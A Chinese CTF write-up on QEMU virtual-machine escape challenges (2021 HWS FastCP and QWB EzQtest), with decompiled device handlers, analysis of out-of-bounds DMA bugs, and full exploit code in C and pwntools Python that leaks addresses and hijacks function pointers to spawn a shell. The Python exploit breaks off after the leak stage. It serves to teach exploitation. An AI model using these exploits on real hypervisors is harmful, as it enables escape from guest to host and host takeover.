# 从qemu逃逸到逃跑

阅读量 **498673**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-11-04 10:30:33

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01728550bc38afc7a1.jpg)

> 在现在CTF比赛中qemu逃逸题目已经越来越常见，希望能通过这篇文章让大家对最近qemu逃逸题目学习有一点帮助

## 2021 HWS FastCP

###  漏洞分析

    
    
    void __fastcall FastCP_class_init(ObjectClass_0 *a1, void *data)
    {
      PCIDeviceClass *v2; // rbx
      PCIDeviceClass *v3; // rax
    
      v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(
                               a1,
                               "device",
                               "/root/source/qemu/hw/misc/fastcp.c",
                               293,
                               "FastCP_class_init");
      v3 = (PCIDeviceClass *)object_class_dynamic_cast_assert(
                               a1,
                               (const char *)&dev,
                               "/root/source/qemu/hw/misc/fastcp.c",
                               294,
                               "FastCP_class_init");
      *(_DWORD *)&v3->vendor_id = 0xBEEFDEAD;
      v3->revision = 1;
      v3->realize = pci_FastCP_realize;
      v3->exit = pci_FastCP_uninit;
      v3->class_id = 0xFF;
      v2->parent_class.categories[0] |= 0x80uLL;
    }
    

注册了`verdor_id=0xBEEFDEAD`和`class_id = 0xff`。

    
    
    00000000 FastCPState     struc ; (sizeof=0x1A30, align=0x10, copyof_4530)
    00000000 pdev            PCIDevice_0 ?
    000008F0 mmio            MemoryRegion_0 ?
    000009E0 cp_state        CP_state ?
    000009F8 handling        db ?
    000009F9                 db ? ; undefined
    000009FA                 db ? ; undefined
    000009FB                 db ? ; undefined
    000009FC irq_status      dd ?
    00000A00 CP_buffer       db 4096 dup(?)
    00001A00 cp_timer        QEMUTimer_0 ?
    00001A30 FastCPState     ends
    
    00000000 CP_state        struc ; (sizeof=0x18, align=0x8, copyof_4529)
    00000000                                         ; XREF: FastCPState/r
    00000000 CP_list_src     dq ?
    00000008 CP_list_cnt     dq ?
    00000010 cmd             dq ?
    00000018 CP_state        ends
    

`FastCPState`结构体如上所示，其中可以看到`CP_buffer`的大小为`0x1000`，其紧邻`cp_timer`函数指针。`CP_state`结构体有`CP_list_src`、`CP_list_cnt`和`cmd`。

    
    
    uint64_t __fastcall fastcp_mmio_read(FastCPState *opaque, hwaddr addr, unsigned int size)
    {
      if ( size != 8 && addr <= 0x1F || addr > 0x1F )
        return -1LL;
      if ( addr == 8 )
        return opaque->cp_state.CP_list_src;
      if ( addr <= 8 )
      {
        if ( !addr )
          return opaque->handling;
        return -1LL;
      }
      if ( addr != 16 )
      {
        if ( addr == 24 )
          return opaque->cp_state.cmd;
        return -1LL;
      }
      return opaque->cp_state.CP_list_cnt;
    }
    

`fastcp_mmio_read`函数，主要是返回`FastCPState`变量的值。

    
    
    void __fastcall fastcp_mmio_write(FastCPState *opaque, hwaddr addr, uint64_t val, unsigned int size)
    {
      int64_t v4; // rax
    
      if ( (size == 8 || addr > 0x1F) && addr <= 0x1F )
      {
        if ( addr == 16 )
        {
          if ( opaque->handling != 1 )
            opaque->cp_state.CP_list_cnt = val;
        }
        else if ( addr == 24 )
        {
          if ( opaque->handling != 1 )
          {
            opaque->cp_state.cmd = val;
            v4 = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL);
            timer_mod(&opaque->cp_timer, v4 / 1000000 + 100);
          }
        }
        else if ( addr == 8 && opaque->handling != 1 )
        {
          opaque->cp_state.CP_list_src = val;
        }
      }
    }
    

`fastcp_mmio_write`函数的功能主要是设置`CP_list_cnt`、`CP_list_src`以及执行`opaque->cp_timer`函数指针

    
    
    void __fastcall fastcp_cp_timer(FastCPState *opaque)
    {
      uint64_t v1; // rax
      uint64_t v2; // rdx
      __int64 v3; // rbp
      uint64_t v4; // r12
      uint64_t v5; // rax
      uint64_t cmd; // rax
      bool v7; // zf
      uint64_t v8; // rbp
      __int64 v9; // rdx
      FastCP_CP_INFO cp_info; // [rsp+0h] [rbp-68h] BYREF
      char buf[8]; // [rsp+20h] [rbp-48h] BYREF
      unsigned __int64 v12; // [rsp+28h] [rbp-40h]
      unsigned __int64 v13; // [rsp+38h] [rbp-30h]
    
      v13 = __readfsqword(0x28u);
      v1 = opaque->cp_state.cmd;
      cp_info.CP_src = 0LL;
      cp_info.CP_cnt = 0LL;
      cp_info.CP_dst = 0LL;
      switch ( v1 )
      {
        case 2uLL:
          v7 = opaque->cp_state.CP_list_cnt == 1;
          opaque->handling = 1;
          if ( v7 )
          {
            cpu_physical_memory_rw(opaque->cp_state.CP_list_src, &cp_info, 
            0x18uLL, 0);
            if ( cp_info.CP_cnt <= 0x1000 )
              cpu_physical_memory_rw(cp_info.CP_src, opaque->CP_buffer, cp_info.CP_cnt, 0);// write
            cmd = opaque->cp_state.cmd & 0xFFFFFFFFFFFFFFFCLL;
            opaque->cp_state.cmd = cmd;
            goto LABEL_11;
          }
          break;
        case 4uLL:
          v7 = opaque->cp_state.CP_list_cnt == 1;
          opaque->handling = 1;
          if ( v7 )
          {
            cpu_physical_memory_rw(opaque->cp_state.CP_list_src, &cp_info, 0x18uLL, 0);
            cpu_physical_memory_rw(cp_info.CP_dst, opaque->CP_buffer, cp_info.CP_cnt, 1);// read
            cmd = opaque->cp_state.cmd & 0xFFFFFFFFFFFFFFF8LL;
            opaque->cp_state.cmd = cmd;
    LABEL_11:
            if ( (cmd & 8) != 0 )
            {
              opaque->irq_status |= 0x100u;
              if ( msi_enabled(&opaque->pdev) )
                msi_notify(&opaque->pdev, 0);
              else
                pci_set_irq(&opaque->pdev, 1);
            }
            goto LABEL_16;
                  }
          break;
        case 1uLL:
          v2 = opaque->cp_state.CP_list_cnt;
          opaque->handling = 1;
          if ( v2 > 0x10 )
          {
    LABEL_22:
            v8 = 0LL;
            do
            {
              v9 = 3 * v8++;
              cpu_physical_memory_rw(opaque->cp_state.CP_list_src + 8 * v9, &cp_info, 0x18uLL, 0);
              cpu_physical_memory_rw(cp_info.CP_src, opaque->CP_buffer, cp_info.CP_cnt, 0);
              cpu_physical_memory_rw(cp_info.CP_dst, opaque->CP_buffer, cp_info.CP_cnt, 1);
            }
            while ( opaque->cp_state.CP_list_cnt > v8 );
          }
          else
          {
            if ( !v2 )
            {
    LABEL_10:
              cmd = v1 & 0xFFFFFFFFFFFFFFFELL;
              opaque->cp_state.cmd = cmd;
              goto LABEL_11;
            }
            v3 = 0LL;
            v4 = 0LL;
            while ( 1 )
            {
              cpu_physical_memory_rw(v3 + opaque->cp_state.CP_list_src, buf, 0x18uLL, 0);
              if ( v12 > 0x1000 )
                break;
              v5 = opaque->cp_state.CP_list_cnt;
              ++v4;
              v3 += 24LL;
              if ( v4 >= v5 )
              {
                if ( !v5 )
                  break;
                goto LABEL_22;
              }
            }
          }
          v1 = opaque->cp_state.cmd;
          goto LABEL_10;
        default:
          return;
      }
      opaque->cp_state.cmd = 0LL;
    LABEL_16:
      opaque->handling = 0;
    }
    

重点需要关注`fastcp_cp_timer`函数：

`case
2`：从`opaque->cp_state.CP_list_src`读取到`cp_info`，然后将`cp_info.CP_src`写入到`opaque->CP_buffer`，长度为`cp_info.CP_cnt`，计算`(opaque->cp_state.cmd
& 0xFFFFFFFFFFFFFFFCLL)&8`判断执行`pci_set_irq`；

`case
4`：先从`opaque->cp_state.CP_list_src`读取`cp_info`，然后将`opaque->CP_buffer`读取到`cp_info.CP_dst`，长度为`cp_info.CP_cnt`。

`case
1`：如果`opaque->cp_state.CP_list_cnt`大小大于`0x10`，则会根据`cp_state.CP_list_cnt`的大小循环从`opaque->cp_state.CP_list_src`读取结构体到`cp_info`，然后依次将`CP_src`中的数据写入到`CP_buffer`，然后从`CP_buffer`中读取数据到`CP_dst`，长度由`CP_cnt`指定。  
这里需要注意除了`case 2`对`cnt`长度进行了检查，其他操作都没有检查`cnt`的长度，也就是存在一个数组越界的漏洞。

###  漏洞利用

这道题的利用思路其实不难，但是一直卡在一个关键的地方，花了一天多时间才搞定。

####  泄漏地址

前面已经说到`case 4`是有一个越界读，而在`buffer`缓冲区下面紧邻的是`cp_timer`函数指针。

    
    
    00000000 QEMUTimer_0     struc ; (sizeof=0x30, align=0x8, copyof_1181)
    00000000                                         ; XREF: FastCPState/r
    00000000 expire_time     dq ?
    00000008 timer_list      dq ?                    ; offset
    00000010 cb              dq ?                    ; offset
    00000018 opaque          dq ?                    ; offset
    00000020 next            dq ?                    ; offset
    00000028 attributes      dd ?
    0000002C scale           dd ?
    00000030 QEMUTimer_0     ends
    

那么我们直接利用这个越界读，读取`cb`指针，就能泄漏`qemu`地址。那么就需要越界读取`0x1010`处的地址。

我这里刚开始的思路是直接申请一个`0x2000`的缓冲区`userbuf`获得其物理地址`phy_userbuf`，然后用来读取数据。但是经过调试我读取完之后，在`0x1010`的数据并非我泄漏的数据。就是这个问题，困扰了我一天。

知道后面我才想到，如果一个物理页大小为`0x1000`，我就算使用`mmap`直接申请`0x2000`大小的缓冲区，虽然获得了连续的虚拟地址，但是这两个虚拟页对应的物理页并不一定是连续的。也就是说我最终读取了`0x1010`的数据到
`phy_userbuf+0x1010`的地址，然后我通过访问虚拟地址`userbuf+0x1010`得到的数据并不对应`phy_userbuf+0x1010`的数据。  
所以这里我就需要去申请两个连续的物理页，这样的申请就需要不断去分配尝试，分配的两个虚拟页获得其物理地址，然后判断其对应的物理地址，看是否是连续的，然后来判断是否对应两个连续的物理页。

**当我们能够获得两个连续的物理页地址时**
，再去泄漏地址，就能保证访问`userbuf+0x1010`对应的数据是`phy_userbuf+0x1010`的数据。

#### **getshell**

能够泄漏地址后，就能够得到`system`地址。

我们只需要修改`QEMUTimer_0.cb`的函数指针为`system_plt`地址，修改`QEMUTimer_0.opaque`为`buffer`地址，在`buffer`中构造`cat
/root/flag`，最终通过`fastcp_mmio_write`中的`case 0x18`去触发即可。

###  EXP

    
    
    #include <stdint.h>
    #include <fcntl.h>
    #include <sys/mman.h>
    #include <sys/io.h>
    #include <stdio.h>
    #include <unistd.h>
    #include <string.h>
    #include <assert.h>
    
    #define HEX(x) printf("[*]0x%016lx\n", (size_t)x)
    #define LOG(addr) printf("[*]%s\n", addr)
    
    unsigned char* mmio_mem;
    uint64_t phy_userbuf;
    char *userbuf;
    uint64_t phy_userbuf1;
    uint64_t phy_buf0;
    char *userbuf1;
    int fd;
    void Err(char* err){
        printf("Error: %s\n", err);
        exit(-1);
    }
    
    void init_mmio(){
        int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
        if(mmio_fd < 0){
            Err("Open pci");
        }
        mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
        if(mmio_mem<0){
            Err("mmap mmio_mem");
        }
    }
    
    void mmio_write(uint64_t addr, uint64_t value){
        *((uint64_t*)(mmio_mem+addr)) = value;
    }
    
    uint64_t mmio_read(uint64_t addr){
        return *((uint64_t*)(mmio_mem+addr)); 
    }
    
    void set_list_cnt(uint64_t cnt){
        mmio_write(0x10, cnt);
    }
    
    void set_src(uint64_t src){
        mmio_write(0x8, src);
    }
    
    void set_cmd(uint64_t cmd){
        mmio_write(0x18, cmd);
    }
    
    void set_read(uint64_t cnt){
        set_src(phy_userbuf);
        set_list_cnt(cnt);
    
        set_cmd(0x4);
        sleep(1);
    }
    
    void set_write(uint64_t cnt){
        set_src(phy_userbuf);
        set_list_cnt(cnt);
    
        set_cmd(0x2);
        sleep(1);
    }
    
    void set_read_write(uint64_t cnt){
        set_src(phy_userbuf);
        set_list_cnt(cnt);
    
        set_cmd(0x1);
        sleep(1);
    }
    
    #define PAGE_SHIFT 12
    #define PAGE_SIZE (1 << PAGE_SHIFT)
    #define PFN_PRESENT (1ull << 63)
    #define PFN_PFN ((1ull << 55) - 1)
    int fd;
    uint32_t page_offset(uint32_t addr)
    {
        return addr & ((1 << PAGE_SHIFT) - 1);
    }
    
    uint64_t gva_to_gfn(void *addr)
    {
        uint64_t pme, gfn;
        size_t offset;
        offset = ((uintptr_t)addr >> 9) & ~7;
        // ((uintptr_t)addr >> 12)<<3
        lseek(fd, offset, SEEK_SET);
        read(fd, &pme, 8);
        if (!(pme & PFN_PRESENT))
            return -1;
        gfn = pme & PFN_PFN;
        return gfn;
    }
    
    /*
    * transfer visual address to physic address
    */
    uint64_t gva_to_gpa(void *addr)
    {
        uint64_t gfn = gva_to_gfn(addr);
        return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
    }
    
    
    size_t va2pa(void *addr){
        uint64_t data;
    
        size_t pagesize = getpagesize();
        size_t offset = ((uintptr_t)addr / pagesize) * sizeof(uint64_t);
    
        if(lseek(fd,offset,SEEK_SET) < 0){
            puts("lseek");
            close(fd);
            return 0;
        }
    
        if(read(fd,&data,8) != 8){
            puts("read");
            close(fd);
            return 0;
        }
    
        if(!(data & (((uint64_t)1 << 63)))){
            puts("page");
            close(fd);
            return 0;
        }
    
        size_t pageframenum = data & ((1ull << 55) - 1);
        size_t phyaddr = pageframenum * pagesize + (uintptr_t)addr % pagesize;
    
        close(fd);
    
        return phyaddr;
    }
    
    void print_hex(uint64_t len, uint64_t offset){
        printf("===========================\n");
        for(int i = 0; i<len/8; i++){
            printf("    0x%lx\n", *(uint64_t*)(userbuf1+offset+i*8));
        }
    }
    
    size_t buf0, buf1;
    
    void get_pages()
    {
        size_t buf[0x1000];
        size_t arry[0x1000];
        size_t arr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, 0, 0);
        *(char *)arr = 'a';
        int n = 0;
        buf[n] = gva_to_gfn(arr);
        arry[n++] = arr;
        for (int i = 1; i < 0x1000; i++)
        {
            arr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, 0, 0);
            *(char *)arr = 'a';
            size_t fn = gva_to_gfn(arr);
            for (int j = 0; j < n; j++)
            {
                if (buf[j] == fn + 1 || buf[j] + 1 == fn)
                {
                    LOG("consist pages");
                    HEX(arr);
                    HEX(fn);
                    HEX(arry[j]);
                    HEX(buf[j]);
                    if (fn > buf[j])
                    {
                        buf0 = arry[j];
                        buf1 = arr;
                        phy_buf0 = (buf[j]<<12);
                    }
                    else
                    {
                        buf1 = arry[j];
                        buf0 = arr;
                        phy_buf0 = (fn<<12);
                    }
                    return;
                }
            }
            buf[n] = fn;
            arry[n++] = arr;
        }
    }
    
    int main(){
    
        fd = open("/proc/self/pagemap",O_RDONLY);
        if(!fd){
            perror("open pagemap");
            return 0;
        }
        get_pages();
    
        printf("init mmio:\n");
        init_mmio();
    
        userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (userbuf == MAP_FAILED)
            Err("mmap userbuf");
        mlock(userbuf, 0x1000);
        phy_userbuf = va2pa(userbuf);
        printf("userbuf va: 0x%llx\n", userbuf);
        printf("userbuf pa: 0x%llx\n", phy_userbuf);
    
        memset(buf0, 'a', 0x1000);
        memset(buf1, 'a', 0x1000);
        printf("[++++] 0x%lx %p\n", buf0, buf0);
        printf("phy_buf0: 0x%lx\n", phy_buf0);
    
        printf("leak addr:\n");
        *(uint64_t*)(userbuf) = phy_userbuf;
        *(uint64_t*)(userbuf+0x8) = 0x1000;
        *(uint64_t*)(userbuf+0x10) = phy_buf0;
        *(uint64_t*)(userbuf+0xff8) = phy_buf0;
        set_write(0x1);
        sleep(1);
        for(int i=0; i<17; i++){
            *(uint64_t*)(userbuf+i*0x18) = phy_userbuf;
            *(uint64_t*)(userbuf+0x8+i*0x18) = 0x1040;
            *(uint64_t*)(userbuf+0x10+i*0x18) = phy_buf0;
        }
        set_read(0x1);
        //sleep(3);
    
        size_t buf_addr = *(size_t*)(buf1+0x18)+0xa00;
        size_t t_addr = *(uint64_t*)(buf1+0x10);
        printf("timer_addr: 0x%llx 0x%lx\n", buf_addr, t_addr);
        size_t system_plt = t_addr - 0x4dce80 + 0x2c2180;
        printf("system_plt: 0x%llx\n", system_plt);
    
        printf("write ptr:\n");
        for(int i=0; i<17; i++){
            *(uint64_t*)(userbuf+i*0x18) = phy_buf0;
            *(uint64_t*)(userbuf+0x8+i*0x18) = 0x1020;
            *(uint64_t*)(userbuf+0x10+i*0x18) = phy_buf0;
        }
        *(uint64_t*)(buf1+0x10) = system_plt;
        *(uint64_t*)(buf1+0x18) = buf_addr;
        char *command="cat /root/flag\x00";
        memcpy(buf0,command,strlen(command));
        printf("cover system addr\n");
        set_read_write(0x11);
        printf("trigger vul\n");
        set_read(0x1);
        return 0;
    }
    

## 2021 强网杯 EzQtest

###  漏洞分析

    
    
    uint64_t qwb_mmio_read(struct QWBState_0* arg1, int64_t arg2, int32_t arg3)
        uint64_t var_18 = -1
        uint64_t rax_1
        if (arg3 != 8)
            rax_1 = -1
        else
            if (arg2 u<= 0x30)
                switch (arg2)
                    case 0
                        var_18 = zx.q(arg1->dma_using)
                    case 8
                        if (arg1->dma_info_size == 0)
                            var_18 = zx.q(arg1->dma_idx)
                    case 0x10
                        if (arg1->dma_info_size == 0 && arg1->dma_idx u<= 0x1f)
                            var_18 = *(arg1 + ((zx.q(arg1->dma_idx) + 0x50) << 5)) // src
                    case 0x18
                        if (arg1->dma_info_size == 0 && arg1->dma_idx u<= 0x1f)
                            var_18 = *(arg1 + ((zx.q(arg1->dma_idx) + 0x50) << 5) + 8) // dst
                    case 0x20
                        if (arg1->dma_info_size == 0 && arg1->dma_idx u<= 0x1f)
                            var_18 = *(arg1 + (zx.q(arg1->dma_idx) << 5) + 0xa10) // cnt
                    case 0x28
                        if (arg1->dma_info_size == 0 && arg1->dma_idx u<= 0x1f)
                            var_18 = *(arg1 + (zx.q(arg1->dma_idx) << 5) + 0xa18) // cmd
                    case 0x30
                        if (arg1->dma_info_size == 0)
                            qwb_do_dma(arg1)
                            var_18 = 1
            rax_1 = var_18
        return rax_1
    

在`qwb_mmio_read`函数中，主要是能够读取`dam_info`的成员变量

    
    
    struct qwb_state* qwb_mmio_write(struct QWBState_0* arg1, int64_t arg2, struct qwb_state* arg3, int32_t arg4)
        struct qwb_state* rax = arg1
        struct qwb_state* var_10 = rax
        if (arg4 == 8 && arg2 u<= 0x28)
            rax = sx.q(jump_table_a7e7ac[arg2]) + &jump_table_a7e7ac
            switch (rax)
                case 0x389216
                    if (arg3 u<= 0x20)
                        rax = var_10
                        rax->dma_using = arg3.d
                case 0x389236
                    rax = zx.q(var_10->dma_info_size)
                    if (rax.d == 0 && arg3 u<= 0x1f)
                        rax = var_10
                        rax->dma_idx = arg3.d
                case 0x389268
                    rax = zx.q(var_10->dma_info_size)
                    if (rax.d == 0)
                        rax = zx.q(var_10->dma_idx)
                        if (rax.d u<= 0x1f)
                            rax = arg3
                            *(((zx.q(var_10->dma_idx) + 0x50) << 5) + var_10) = rax // dma_info.src
                case 0x3892b4
                    rax = zx.q(var_10->dma_info_size)
                    if (rax.d == 0)
                        rax = zx.q(var_10->dma_idx)
                        if (rax.d u<= 0x1f)
                            rax = arg3
                            *(var_10 + ((zx.q(var_10->dma_idx) + 0x50) << 5) + 8) = rax // dma_info.dst
                case 0x389304
                    rax = zx.q(var_10->dma_info_size)
                    if (rax.d == 0)
                        rax = zx.q(var_10->dma_idx)
                        if (rax.d u<= 0x1f)
                            rax = arg3
                            *(var_10 + (zx.q(var_10->dma_idx) << 5) + 0xa10) = rax // dma_info.cnt
                case 0x389350
                    rax = zx.q(var_10->dma_info_size)
                    if (rax.d == 0)
                        rax = zx.q(var_10->dma_idx)
                        if (rax.d u<= 0x1f)
                            rax = var_10 + (zx.q(var_10->dma_idx) << 5) + 0xa18 // dma_info.cmd
                            rax->__offset(0x0).q = zx.q(arg3.d & 1)
        return rax
    

`qwb_mmio_write`函数主要是能够设置`dma_info`的成员变量。

    
    
    void __cdecl qwb_do_dma(QWBState_0 *opaque)
    {
      _QWORD idx; // [rsp+10h] [rbp-10h]
      _QWORD idxa; // [rsp+10h] [rbp-10h]
    
      opaque->dma_using = 1;
      for ( idx = 0LL; idx < opaque->dma_info_size; ++idx )
      {
        if ( opaque->dma_info[idx].cmd )            // device -> address_space
        {
          if ( opaque->dma_info[idx].src + opaque->dma_info[idx].cnt > 0x1000 || opaque->dma_info[idx].cnt > 0x1000 )
            goto end;
        }
        else if ( opaque->dma_info[idx].dst + opaque->dma_info[idx].cnt > 0x1000 || opaque->dma_info[idx].cnt > 0x1000 )
        {                                           // address_space -> device
          goto end;
        }
      }
      for ( idxa = 0LL; idxa < opaque->dma_info_size; ++idxa )
      {
        if ( opaque->dma_info[idxa].cmd )
          pci_dma_write_3(                          // device -> address_space
            &opaque->pdev,
            opaque->dma_info[idxa].dst,
            &opaque->dma_buf[opaque->dma_info[idxa].src],
            opaque->dma_info[idxa].cnt);
        else
          pci_dma_read_3(
            &opaque->pdev,                          // address_space -> device
            opaque->dma_info[idxa].src,
            &opaque->dma_buf[opaque->dma_info[idxa].dst],
            opaque->dma_info[idxa].cnt);
      }
    end:
      opaque->dma_using = 0;
    }
    

重点关注的就是这个`qwb_do_dma`函数。该函数能够对`dma_buf`缓冲区进行读取。这里首先会检查`src+cnt`和`dst+cnt`是否大于`0x1000`，以及检查`cnt`是否大于`0x1000`。

但是，这里只检查了上界，并没有检查下界。也就是`src+cnt`和`dst+cnt`是可以为负数，那么这样就可以对`dma_buf`向上读取。

而在向上读取时，与`dma_buf`紧邻的是`dma_info`结构体，那么我们就可以修改`dma_info`来实现任意地址读写。

这道题还有一个特殊点在于，需要与2021
年强网杯的另一道题`EzCloud`结合起来，需要利用那道题的功能与`qemu`建立连接，全部操作都是以`monitor`命令的形式操作。这里本地搭建时为了简便，便直接将`exp`脚本的数据包转发到`qemu`内，使其直接与`qemu`通信，不需要再通过`EzCloud`转发。这里转发数据包使用`socat`:

    
    
    #!/bin/sh
    socat TCP4-LISTEN:6666,reuseaddr,fork EXEC:"./launch.sh",stderr
    

关于`Qtest`命令行的命令，可以参考[这篇文章](https://qemu.readthedocs.io/en/latest/devel/qtest.html)。

###  漏洞利用

####  PCI设备初始化

这道题目的一个难点就在于，他并没有完整实现整个`PCI`设备的初始化，这里需要我们自己去完成`PCI`设备地址的初始化。

参考自[这篇文章](https://github.com/GiantVM/doc/blob/master/pci.md)。

    
    
    1、在 do_pci_register_device 中分配内存，对config内容进行设置，如 pci_config_set_vendor_id
    2、在 pci_e1000_realize 中继续设置config，包括 pci_register_bar 中将BAR base address设置为全f
    3、由于有ROM(efi-e1000.rom)，于是调用 pci_add_option_rom ，注册 PCI_ROM_SLOT 为BAR6
    4、pci_do_device_reset (调用链前面提过) 进行清理和设置
    5、KVM_EXIT_IO QEMU => KVM => VM 后，当VM运行port I/O指令访问config信息时，发生VMExit，VM => KVM => QEMU，QEMU根据 exit_reason 得知原因是 KVM_EXIT_IO ，于是从 cpu->kvm_run 中取出 io 信息，最终调用pci_default_read_config
    6、设置完config后，在Linux完成了了对设备的初始化后，就可以进行通信了。当VM对映射的内存区域进行访问时，发生VMExit，VM => KVM => QEMU，QEMU根据 exit_reason 得知原因是 KVM_EXIT_MMIO ，于是从 cpu->kvm_run 中取出 mmio 信息，最终调用e1000_mmio_write
    

根据这个流程，要正确完成设备配置的需要向`BAR`写`MMIO`的地址。通过文档可以知道`i440fx-pcihost`初始化操作如下：

    
    
    static void i440fx_pcihost_realize(DeviceState *dev, Error **errp)
    {
    ..
        sysbus_add_io(sbd, 0xcf8, &s->conf_mem);
        sysbus_init_ioports(sbd, 0xcf8, 4);
    
        sysbus_add_io(sbd, 0xcfc, &s->data_mem);
        sysbus_init_ioports(sbd, 0xcfc, 4);
    ...
    }
    

这里如果在命令行中之心命令`info qtree`可以知道`qwb`这个设备是`i440fx-pcihost`下面的设备，则该设备在初始化阶段会沿用父类`i44fx`绑定的端口。

这里初始化所需要的步骤如下：

1、 将`MMIO`地址写入到`qwb`设备的`BAR0`地址

​ 通过 0xcf8 端口设置目标地址

​ 通过 0xcfc 端口写值

2、 将命令写入qwb设备的COMMAND地址，触发`pci_update_mappings`

​ 通过 0xcf8 端口设置目标地址

​ 通过 0xcfc 端口写值

这里首先需要知道`qwb`设备的地址，`qwb`设备的`Bus number`为0，`Device number`为2，`Function
number`为0，得出`qwb`的地址为`0x80001000`。

![](https://p2.ssl.qhimg.com/t01d17e175f609ccd94.png)

`BAR0`的偏移为`0x10`，`COMMAND`的偏移为4.

然后我们需要解决写什么值的问题，`MMIO`地址可以直接拿文档一中的地址`0xfebc0000`。而`COMMAND`值的设置就另有说法了，文档二中给出了`COMMAND`的比特位定义：

![](https://p0.ssl.qhimg.com/t0185c4711ee8f53dfc.png)

这里选择`0x107`，即设置`SERR`，`Memory space`和`IO space`、`Bus Master`。

所以最后初始化阶段需要执行的命令如下：

设置`BAR0`地址：

​ 1、`outl 0xcf8 0x80001010`

​ 2、`outl 0xcfc 0xfebc0000`

设置`COMMAND`

3、`outl 0xcf8 0x80001004`

4、`outw 0xcfc 0x107`

执行上述命令之后观察`pci`设备可以看到`BAR0`已经设置上了`0xfeb00000`，对该地址进行读写能正确触发`MMIO handler`的断点。

####  利用思路

**越界读泄漏地址**

首先通过上溢`0xee0`处可以读取到一个`libc`地址。再通过上溢到`opaque->pdev`可以泄漏一个`qemu`程序基址。

**越界写提权**

最开始想直接将`QWBState->pdev->config_read`指针覆盖为`system_plt`地址，将`QWBState->pdev`覆盖为`/bin/sh`地址。但是这样做会使得在覆盖完后，执行`inw`指令时报错。

关于如何`getshell`卡了很久。最终参考[这篇博客](https://matshao.com/2021/06/15/QWB2021-Quals-EzQtest/#more)看到了一种提权的方法。

`matshao`大佬找到两个`gadget`:

    
    
    gadget1: 0x3d2f05：lea rdi, "/bin/sh"; call execv
    gadget2: 0x0000000014bd1e: mov rsi, [rbx+0x10]; mov rdx, r12; mov rdi, r14; call qword ptr [rax+0x20];
    

所以这里将`QWBState->pdev->config_read`指针覆盖为`gadget2`地址，将`QWBState->pdev+0x20`处覆盖为`gadget1`地址即可。

###  EXP

    
    
    from pwn import *
    context.update(arch='amd64', os='linux', log_level='debug')
    context.terminal = (['tmux', 'split', '-h'])
    
    libcname = '/lib/x86_64-linux-gnu/libc.so.6'
    debug = 1
    if debug == 1:
        p = process(
            './qemu-system-x86_64  -display  none -machine  accel=qtest -m  512M -device  qwb -nodefaults -monitor  telnet:127.0.0.1:5555,server,nowait -qtest  stdio'.split())
        libc = ELF(libcname)
    
    else:
        p = remote()
        libc = ELF(libcname)
    
    
    def init_pci():
        print("write base")
        p.sendline("outl 3320 {}".format(0x80001010))
        p.sendline("outl 3324 {}".format(0xfebc0000))
        print("write command update")
        p.sendline("outl 3320 {}".format(0x80001004))
        p.sendline("outw 3324 {}".format(0x107))
    
    
    BASE = 0xfeb00000
    
    
    def set_size(sz):
        p.sendline("writeq {} {}".format(BASE, sz))
        p.recvuntil("OK")
    
    
    def get_size():
        p.sendline("readq {}".format(BASE))
        p.recvuntil("OK")
    
    
    def set_idx(idx):
        p.sendline("writeq {} {}".format(BASE + 8, idx))
        p.recvuntil("OK")
    
    
    def get_idx():
        p.sendline("readq {}".format(BASE + 8))
        p.recvuntil("OK")
    
    
    def set_src(addr):
        p.sendline("writeq {} {}".format(BASE + 0x10, addr))
        p.recvuntil("OK")
    
    
    def set_dst(addr):
        p.sendline("writeq {} {}".format(BASE + 0x18, addr))
        p.recvuntil("OK")
    
    
    def set_cnt(num):
        p.sendline("writeq {} {}".format(BASE + 0x20, num))
        p.recvuntil("OK")
    
    
    def set_cmd(num):
        p.sendline("writeq {} {}".format(BASE + 0x28, num))
        p.recvuntil("OK")
    
    
    def do_dma():
        p.sendline("readq {}".format(BASE + 0x30))
        p.recvuntil("OK ")
        p.recvuntil("OK ")
    
    
    # device -> as
    def dma_write(idx, src, dst, cnt):
        set_idx(idx)
        set_src(src)
        set_dst(dst)
        set_cnt(cnt)
        set_cmd(1)
    
    
    # as -> device
    def dma_read(idx, src, dst, cnt):
        set_idx(idx)
        set_src(src)
        set_dst(dst)
        set_cnt(cnt)
        set_cmd(0)
    
    def writeb64(addr, value):
        encoded = b64e(value)
        p.sendline("b64write {} {} {}".format(addr, len(value), encoded))
        p.recvuntil("OK")
    
    def readb64(addr, sz):
        p.sendline("b64read {} {}".format(addr, sz))
        p.recvuntil("OK ")
        content = p.recvuntil("\n")
        p.recvuntil("OK ")
        return b64d(content)
    
    def read_1(addr):
        p.sendline("readq {}".format(addr))
        p.recvuntil("OK ")
        content = p.recvuntil("\n")
        p.recvuntil("OK ")
        return int(content, 16)
    
    user_buf = 0x40000
    def pwn():
        init_pci()
    
        print("[+] oob read to leak libc_addr")
        set_size(32)
        dma_write(0, (1<<64)-0xf00, user_buf, 0x1000)
        do_dma()
        data = readb64(user_buf+0x20, 0x10)
        print(data)
        libc_addr = u64(data[8:].ljust(8, b'\x00'))
        print("[+] libc_addr:", hex(libc_addr))
        libc_base = libc_addr-0x1e1072-0xa000
        print("[+] libc_base:",hex(libc_base))
    
        print("[+] oob read to leak plt_addr")
        dma_write(0, (1<<64)-0xe00, user_buf+0x1000, 0x1000)
        do_dma()
    
        data = readb64(user_buf+0x1000, 0x10)
        print(data)
        dev_addr = u64(data[8:].ljust(8, b'\x00'))
        print("[+] dev_addr:", hex(dev_addr))
        plt_base = dev_addr - 0x2d4ec0
        system_plt = plt_base + 0x2d6be0
        binsh = plt_base + 0xa70098
        print("[+] system_plt:", hex(system_plt))
        print("[+] binsh:", hex(binsh))
    
        heap_addr = read_1(user_buf + 0x1000 + 0xc0)
        print("[+] heap_addr:", hex(heap_addr))
    
